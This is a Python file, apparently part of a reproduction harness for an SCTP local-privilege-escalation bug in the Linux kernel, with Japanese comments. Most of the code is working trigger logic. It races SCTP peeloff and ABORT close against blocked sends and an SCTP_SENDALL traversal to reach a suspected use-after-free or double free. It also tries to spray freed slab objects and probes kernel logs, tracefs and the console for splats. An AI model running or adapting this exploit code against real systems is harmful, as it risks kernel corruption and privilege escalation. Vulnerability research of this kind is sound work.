        c_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO,
                          struct.pack("ll", 0, 20000))
        c_sock.sendto(b"f", ("127.0.0.1", p_fill))
        time.sleep(0.03)
        rec["configured"] = True
        eagain = 0
        for i in range(fill_budget):
            try:
                c_sock.sendto(b"A" * 4096, ("127.0.0.1", p_fill))
                eagain = 0
            except OSError as e:
                if e.errno in (errno.EAGAIN, errno.EWOULDBLOCK):
                    eagain += 1
                    if eagain >= 3:
                        break
                else:
                    break
            if i % 16 == 0:
                time.sleep(0.001)
        c_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO,
                          struct.pack("ll", 0, timeout_us))
        hold = {}

        def sender():
            try:
                hold["ret"] = c_sock.sendto(b"B" * 16384, ("127.0.0.1", p_new))
            except OSError as e:
                hold["errno"] = e.errno

        th = threading.Thread(target=sender, daemon=True)
        th.start()
        time.sleep(0.02)
        rec["blocked"] = th.is_alive()
        # ブロック中に /proc 上の新規 asoc (rport=p_new) を見る
        for row in _assoc_table():
            if row["lport"] == str(lport) and row["rport"] == str(p_new):
                rec["new_id_while_blocked"] = row["id"]
                rec["new_state_while_blocked"] = row["state"]
                break
        rec["ids_while_blocked"] = _assoc_ids(c_sock)
        # 相手側から INIT を送って id 付与を試みる (INIT collision)
        if th.is_alive():
            try:
                srv_new.sendto(b"hi", ("127.0.0.1", lport))
            except OSError:
                pass
            time.sleep(0.05)
            rec["init_collision_id"] = _find_assoc_id(lport, p_new)
            rec["ids_after_init"] = _assoc_ids(c_sock)
            # id が付いたら peeloff を試す
            cand = rec["init_collision_id"]
            if isinstance(cand, int) and cand > 2 and th.is_alive():
                fd, perr, _raw = _peeloff(c_sock, cand)
                if fd is not None:
                    rec["peel"] = True
                    _close_fd_abort(fd)
        th.join(timeout=max(0.5, timeout_us / 1e6 + 0.5))
        rec["send_errno"] = hold.get("errno")
        rec["send_ret"] = hold.get("ret")
        rec["rows_after"] = len(_assoc_table())
    except OSError as e:
        rec["error"] = "%s (errno=%s)" % (e, getattr(e, "errno", None))
    finally:
        for s in (c_sock, srv_fill, srv_new):
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass
    return rec


# --------------------------------------------------------------------------
# 試行 4: SCTP_SENDALL の待機中にリスト上の次 association を peeloff
#         (6.8 系で残る double free / UAF 候補経路)
# --------------------------------------------------------------------------
def _trial_sendall(drain_delay=0.12):
    rec = {"kind": "sendall", "configured": False, "blocked": False,
           "peel": False, "send_ret": None, "send_errno": None, "drained": 0}
    srv1 = srv2 = c_sock = None
    try:
        srv1 = socket.socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP)
        srv1.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
        srv1.bind(("127.0.0.1", 0))
        srv1.listen(8)
        p1 = srv1.getsockname()[1]
        srv2 = socket.socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP)
        srv2.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
        srv2.bind(("127.0.0.1", 0))
        srv2.listen(8)
        p2 = srv2.getsockname()[1]
        c_sock = socket.socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP)
        c_sock.bind(("127.0.0.1", 0))
        c_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 32768)
        c_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO,
                          struct.pack("ll", 0, 20000))
        c_sock.sendto(b"1", ("127.0.0.1", p1))
        c_sock.sendto(b"2", ("127.0.0.1", p2))
        time.sleep(0.03)
        rec["configured"] = True
        eagain = 0
        for i in range(400):
            try:
                c_sock.sendto(b"A" * 4096, ("127.0.0.1", p1))
                eagain = 0
            except OSError as e:
                if e.errno in (errno.EAGAIN, errno.EWOULDBLOCK):
                    eagain += 1
                    if eagain >= 3:
                        break
                else:
                    break
            if i % 16 == 0:
                time.sleep(0.001)
        ids = _assoc_ids(c_sock)
        rec["ids"] = ids
        if len(ids) < 2:
            return rec
        c_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO, struct.pack("ll", 2, 0))
        anc = [(IPPROTO_SCTP, SCTP_SNDINFO,
                struct.pack("=HHIIi", 0, SCTP_SENDALL, 0, 0, 0))]
        hold = {}

        def sender():
            try:
                hold["ret"] = c_sock.sendmsg([b"B" * 4096], anc)
            except OSError as e:
                hold["errno"] = e.errno

        th = threading.Thread(target=sender, daemon=True)
        th.start()
        time.sleep(0.02)
        rec["blocked"] = th.is_alive()
        # リストの 2 番目 (次に処理される asoc) を peeloff + ABORT close
        if th.is_alive():
            fd, perr, _raw = _peeloff(c_sock, ids[1])
            rec["peeloff_errno"] = perr
            if fd is not None:
                rec["peel"] = True
                _close_fd_abort(fd)
        time.sleep(drain_delay)
        # srv1 を drain して待機中の送信を再開させる
        srv1.settimeout(0.05)
        end = time.time() + 0.6
        while time.time() < end and th.is_alive():
            try:
                d = srv1.recv(65536)
                rec["drained"] += len(d)
            except OSError:
                pass
        th.join(timeout=1.0)
        rec["send_ret"] = hold.get("ret")
        rec["send_errno"] = hold.get("errno")
    except OSError as e:
        rec["error"] = "%s (errno=%s)" % (e, getattr(e, "errno", None))
    finally:
        for s in (c_sock, srv1, srv2):
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass
    return rec


# --------------------------------------------------------------------------
# 本体
# --------------------------------------------------------------------------
def run(workdir=DEFAULT_WORKDIR):
    workdir = workdir or DEFAULT_WORKDIR
    try:
        os.makedirs(workdir, exist_ok=True)
    except OSError:
        pass
    module_dir = os.path.dirname(os.path.abspath(__file__))
    log_path = os.path.join(workdir, "sctp_lpe_run.log")
    started = time.time()
    log_lines = []

    def log(msg):
        line = "[%s] %s" % (time.strftime("%H:%M:%S"), msg)
        log_lines.append(line)

    # --- SCTP の有無 ---
    try:
        probe = socket.socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP)
        probe.close()
        sctp_ok = True
        sctp_err = None
    except OSError as e:
        sctp_ok = False
        sctp_err = "%s (errno=%s)" % (e, getattr(e, "errno", None))

    try:
        kernel_ver = open("/proc/version").read().strip()
    except OSError:
        kernel_ver = "unknown"

    if not sctp_ok:
        detail = ("SCTP ソケットを作成できないためスキップした。"
                  "socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP=132) の失敗: %s"
                  % sctp_err)
        result = {"cve": "SCTP-LPE", "configured": False, "trigger": False,
                  "effect": "SKIP", "detail": detail}
        _write_outputs(module_dir, result, log_path, log_lines)
        return result

    log("kernel: %s" % kernel_ver)
    base_texts, klog_attempts = _read_klog(workdir)
    log("klog baseline: %s" % "; ".join(klog_attempts))
    slab0 = _slab_sctp()
    log("slab baseline: %s" % slab0)
    km1k_0 = _slab_active("kmalloc-1k")
    km4k_0 = _slab_active("kmalloc-rnd-01-4k")
    tr_attempts, tr_text = _probe_tracefs()
    log("tracefs probe: %s" % "; ".join(tr_attempts))
    alt_attempts = _probe_alt_channels()
    log("alt channels: %s" % "; ".join(alt_attempts))
    tap = _ConsoleTap(workdir)
    log("console tap: %s" % "; ".join(tap.attempts) if tap.attempts else "console tap: started")
    log("kmalloc-1k baseline: %s" % km1k_0)

    stats = {"literal": None, "wait_peeloff": [], "new_asoc": [],
             "sendall": [], "klog_attempts": klog_attempts}
    deadline = started + 65.0  # 実行時間の上限 (秒)

    # 1) 記事のリテラル手順 (SOCK_STREAM)
    try:
        stats["literal"] = _trial_literal_stream()
        log("literal_stream: %s" % json.dumps(stats["literal"], ensure_ascii=False))
    except Exception as e:  # noqa: BLE001
        stats["literal"] = {"error": repr(e)}
        log("literal_stream error: %r" % e)

    # 2) 本命ループ (既存 association を待機中に peeloff)
    for i in range(120):
        if time.time() > deadline:
            break
        try:
            r = _trial_wait_peeloff()
        except Exception as e:  # noqa: BLE001
            r = {"error": repr(e)}
        stats["wait_peeloff"].append(r)
        if i < 5 or i % 20 == 0 or r.get("send_errno") not in (errno.EPIPE, None):
            log("wait_peeloff[%d]: %s" % (i, json.dumps(r, ensure_ascii=False)))

    # 3) 新しい association ができる送信の観測
    for i in range(8):
        if time.time() > deadline:
            break
        try:
            r = _trial_new_asoc()
        except Exception as e:  # noqa: BLE001
            r = {"error": repr(e)}
        stats["new_asoc"].append(r)
        if i < 3:
            log("new_asoc[%d]: %s" % (i, json.dumps(r, ensure_ascii=False)))

    # 4) SCTP_SENDALL 経路
    for i in range(6):
        if time.time() > deadline:
            break
        try:
            r = _trial_sendall()
        except Exception as e:  # noqa: BLE001
            r = {"error": repr(e)}
        stats["sendall"].append(r)
        log("sendall[%d]: %s" % (i, json.dumps(r, ensure_ascii=False)))

    # --- 後処理・集計 ---
    tap_text = tap.stop() if tap is not None else ""
    log("console tap: captured %d bytes" % len(tap_text))
    time.sleep(0.2)
    after_texts, klog_attempts2 = _read_klog(workdir)
    log("klog after: %s" % "; ".join(klog_attempts2))
    all_texts = base_texts + after_texts
    if tap_text.strip():
        all_texts = all_texts + [tap_text]
    hits = _scan_klog(all_texts)
    slab1 = _slab_sctp()
    km1k_1 = _slab_active("kmalloc-1k")
    km4k_1 = _slab_active("kmalloc-rnd-01-4k")
    log("slab after: %s" % slab1)
    log("kmalloc-1k after: %s" % km1k_1)

    wp = stats["wait_peeloff"]
    blocked = sum(1 for r in wp if r.get("blocked"))
    peeled = sum(1 for r in wp if r.get("peel"))
    epipe = sum(1 for r in wp if r.get("send_errno") == errno.EPIPE)
    eagain = sum(1 for r in wp if r.get("send_errno") in (errno.EAGAIN, errno.EWOULDBLOCK))
    other_err = {}
    for r in wp:
        e = r.get("send_errno")
        if e is not None and e not in (errno.EPIPE, errno.EAGAIN, errno.EWOULDBLOCK):
            other_err[e] = other_err.get(e, 0) + 1
    na = stats["new_asoc"]
    na_blocked = sum(1 for r in na if r.get("blocked"))
    na_peeled = sum(1 for r in na if r.get("peel"))
    na_ids = {}
    for r in na:
        k = str(r.get("new_id_while_blocked"))
        na_ids[k] = na_ids.get(k, 0) + 1
    sa = stats["sendall"]
    sa_ok = sum(1 for r in sa if r.get("send_ret") is not None)
    sa_peel = sum(1 for r in sa if r.get("peel"))
    lit = stats["literal"] or {}

    klog_available = bool(base_texts or after_texts)

    # --- 判定 ---
    # 挙動的 UAF 追試の結論 (intent 509 → 529, notes §13):
    #   KERNEL-UAF に昇格できるのは、カーネルログ / コンソール tap に splat が出た場合 (hits) のみ。
    #   解放済み assoc (BTF 実測 2112B, kmalloc-rnd-01-4k) を assoc 400 個で再配置しても、
    #   peel+close 後の SCTP_SENDALL 走査は当該要素を再訪しない (stream 交渉差 EINVAL プローブで実証)
    #   ため、SIGKILL / EPIPE 以外の errno / 誤配送 / ハングは出ない。
    #   よって hits が無い限り TRIGGERED 据え置きとし、UAF は inferred として扱う
    #   (「異常が出ないこと」は UAF 不在の証明ではなく、走査が踏まないことの帰結)。
    configured = bool(lit.get("configured")) and blocked > 0
    trigger = blocked > 0 and (peeled > 0 or epipe > 0 or sa_peel > 0)
    if hits:
        effect = "KERNEL-UAF"
    elif trigger:
        effect = "TRIGGERED"
    elif sctp_ok:
        effect = "TRIGGERED" if blocked > 0 else "ERROR"
    else:
        effect = "SKIP"

    detail_lines = []
    detail_lines.append("カーネル: %s" % kernel_ver)
    detail_lines.append(
        "SCTP: 利用可能 (socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP=132) で作成成功)。")
    if lit.get("configured"):
        detail_lines.append(
            "リテラル手順 (SOCK_STREAM): SCTP_STATUS(optname=14) で assoc id=%s を取得。"
            "SCTP_SOCKOPT_PEELOFF(optname=102) の結果 errno=%s "
            "(1-to-1 スタイルでは peeloff 非対応のため -EINVAL=22)。"
            % (lit.get("assoc_id"), lit.get("peeloff_errno")))
    else:
        detail_lines.append("リテラル手順 (SOCK_STREAM): %s" % lit.get("error", "未実行"))
    detail_lines.append(
        "本命手順 (SOCK_SEQPACKET, SO_SNDBUF=32768): %d 回中 %d 回で送信が sndbuf 待ちで"
        "ブロックし、%d 回で association を SCTP_SOCKOPT_PEELOFF(102) により別 fd へ移動して"
        " close した。待機中の送信は EPIPE(errno=32) で復帰: %d 回、EAGAIN(errno=11): %d 回。"
        % (len(wp), blocked, peeled, epipe, eagain))
    if other_err:
        detail_lines.append("その他の送信 errno: %s" % other_err)
    detail_lines.append(
        "新規 association を作る送信 (sendto(daddr)) の待機中観測: %d 回中 %d 回ブロック。"
        "ブロック中の /proc/net/sctp/assocs 上の assoc-id は %s (CLOSED, ep->asocs 未登録) で、"
        "SCTP_GET_ASSOC_ID_LIST にも現れないため、この段階での peeloff は不可 (6.8 系の"
        "wait_for_sndbuf→ASSOCIATE 順序)。相手側からの INIT による id 付与後の peeloff 成功: %d 回。"
        % (len(na), na_blocked, na_ids, na_peeled))
    detail_lines.append(
        "SCTP_SENDALL 経路: %d 回実行し、待機中にリスト上の次 association を peeloff+ABORT close した回: %d、"
        "待機後に送信が再開して SENDALL 自体が成功した回: %d (UAF 候補経路に到達)。"
        % (len(sa), sa_peel, sa_ok))
    if klog_available:
        detail_lines.append("カーネルログ: 取得可能 (%s)。" % "; ".join(stats["klog_attempts"] + klog_attempts2))
        if hits:
            detail_lines.append("検出したカーネルメッセージ:\n" + "\n".join(hits[:10]))
        else:
            detail_lines.append("検出した KASAN/double free/use-after-free メッセージ: なし。")
    else:
        detail_lines.append(
            "カーネルログ: /dev/kmsg と /proc/kmsg は open/read できず、dmesg と klogctl(3) も失敗"
            " (dmesg_restrict=1 かつ CAP_SYSLOG/CAP_SYS_ADMIN 無し)。試行結果: %s。"
            "このため KASAN/double free のメッセージ検出はできず、effect=%s とした。"
            % ("; ".join(stats["klog_attempts"] + klog_attempts2), effect))
    if slab0 or slab1:
        detail_lines.append("SCTP slab (active_objs, num_objs): baseline=%s → after=%s" % (slab0, slab1))
    detail_lines.append("kmalloc-rnd-01-4k active_objs (association 実体: BTF 実測 2112B): baseline=%s → after=%s"
                        % (km4k_0, km4k_1))
    detail_lines.append("kmalloc-1k active_objs (参考値。association 実体ではない): baseline=%s → after=%s"
                        % (km1k_0, km1k_1))
    detail_lines.append(
        "挙動的 UAF 追試 (uaf_v5/uaf_v6/streamtest): 解放後 assoc (BTF 実測 2112B, kmalloc-rnd-01-4k) を "
        "assoc 400 個で再配置しても、peel 済み要素は走査に再訪されず (stream 交渉差 EINVAL プローブ: "
        "peel 無し errno=22 → peel 後 ret=4096)、二次異常 (SIGKILL / EPIPE 以外の errno / 誤配送 / ハング) は "
        "観測されなかった。よって effect=KERNEL-UAF へは昇格せず、TRIGGERED 据え置き (UAF は inferred)。")
    detail_lines.append("tracefs/ftrace/kprobe 観測の試行: %s"
                        % "; ".join(tr_attempts[:12]))
    if tr_text.strip():
        detail_lines.append("trace_pipe 抜粋: " + tr_text.strip()[:2000])
    detail_lines.append("代替観測路 (userns/BPF/config/slab) の試行: %s"
                        % "; ".join(alt_attempts))
    tap_note = "; ".join(tap.attempts) if tap.attempts else "no attempt"
    detail_lines.append("コンソール tap (/dev/console 5:1 + UART TIOCM_LOOP): %s; captured=%d bytes"
                        % (tap_note, len(tap_text)))
    if tap_text.strip():
        detail_lines.append("コンソール tap 抜粋: %r" % tap_text.strip()[:500])
    detail_lines.append("実行時間: %.1f 秒" % (time.time() - started))

    result = {
        "cve": "SCTP-LPE",
        "configured": bool(configured),
        "trigger": bool(trigger),
        "effect": effect,
        "detail": "\n".join(detail_lines),
    }
    log("RESULT: %s" % json.dumps({k: v for k, v in result.items() if k != "detail"},
                                  ensure_ascii=False))
    _write_outputs(module_dir, result, log_path, log_lines)
    return result


def _write_outputs(module_dir, result, log_path, log_lines):
    try:
        with open(os.path.join(module_dir, "sctp_lpe.result.json"), "w") as f:
            json.dump(result, f, ensure_ascii=False, indent=2)
            f.write("\n")
    except OSError:
        pass
    try:
        with open(log_path, "w") as f:
            f.write("\n".join(log_lines) + "\n")
    except OSError:
        pass


if __name__ == "__main__":
    wd = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_WORKDIR
    res = run(wd)
    print(json.dumps(res, ensure_ascii=False, indent=2))
